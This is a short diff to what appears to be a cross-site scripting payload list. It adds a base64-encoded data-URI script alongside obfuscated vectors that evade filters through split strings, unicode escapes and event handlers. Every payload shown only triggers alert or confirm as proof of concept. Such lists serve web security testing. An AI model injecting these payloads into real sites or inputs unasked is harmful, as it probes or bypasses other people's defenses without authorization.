@@ -1,6 +1,7 @@
 1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
 <detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//
 <script>alert('test');</script>
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 alert(document.domain)
 (alert)(document.domain)
 al\u0065rt(document.domain)
